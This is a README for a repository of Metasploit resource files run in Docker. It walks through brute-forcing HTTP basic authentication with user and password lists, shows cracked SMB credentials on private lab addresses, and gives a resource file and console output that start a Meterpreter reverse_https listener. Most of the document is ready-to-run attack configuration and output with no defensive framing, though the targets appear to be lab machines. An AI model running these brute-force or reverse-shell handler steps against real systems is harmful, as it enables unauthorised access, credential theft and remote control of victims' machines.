# Metasploit-resource-files

## Prepare a password list and a dictionary list
- [pass.list](https://github.com/DharmaDoll/Metasploit-resource-files/blob/main/pass.list)
- [uer.list](https://github.com/DharmaDoll/Metasploit-resource-files/blob/main/user.list)

## Setup docker container 
```sh
$ ./setup.sh
```

## Preparing metasploit resource file(.rc)
- [Brute force login to system using http basic authentication sample (http_basic.rc)](https://github.com/DharmaDoll/Metasploit-resource-files/blob/main/http_basic.rc)

## Run the exploit
```sh
$ ./exploit.sh kali_rolling http_basic.rc 2020_test_workspace
```

## Check result
```sh
$ docker exec -it kali_rolling msfconsole

msf6 > workspace
  2020_test_workspace
* default

msf6 > workspace 2020_test_workspace
msf6 > creds
==========
host           origin        service        public         private               realm  private_type  JtR Format
----           ------        -------        ------         -------               -----  ------------  ----------
172.21.121.2   172.21.121.2  445/tcp (smb)  mike           P@ssw0rd                     Password
172.21.121.2   172.21.121.2  445/tcp (smb)  michel         root                         Password
172.21.121.2   172.21.121.2  445/tcp (smb)  Administrator  admin                        Password
```

## Use the multi handler
##### Prepare file for [multi hander](https://github.com/DharmaDoll/Metasploit-resource-files/blob/main/resouece/multihandler.rc.txt)
```
use exploit/multi/handler;
set payload windows/x64/meterpreter/reverse_https;
set LHOST 0.0.0.0;
set LPORT {{YOUR_PORT}};
run;
exit;
``` 
##### Run
```sh
$ ./handler.sh resources/multihandler.rc.txt 8499

[+] Run container(msf_handler)...
[+] Recived IP(your host) is 172.28.68.51 and port tcp/8499
...
       =[ metasploit v6.2.11-dev                          ]
+ -- --=[ 2233 exploits - 1179 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your
module, why not try the reload command

[-] Database not connected
[-] Database not connected
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_https
LHOST => 0.0.0.0
LPORT => 8499
[*] Started HTTPS reverse handler on https://0.0.0.0:8499

```
```sh
$ docker ps
CONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS          PORTS                    NAMES
bed4e81095da   kali/msfconsole:0.1   "msfconsole -x 'work…"   13 seconds ago   Up 12 seconds   0.0.0.0:8499->8499/tcp   msf_handler
6e0ab98754fe   kali/msfconsole:0.1   "/bin/sh -c 'service…"   8 days ago       Up 8 days                                kali_rolling
```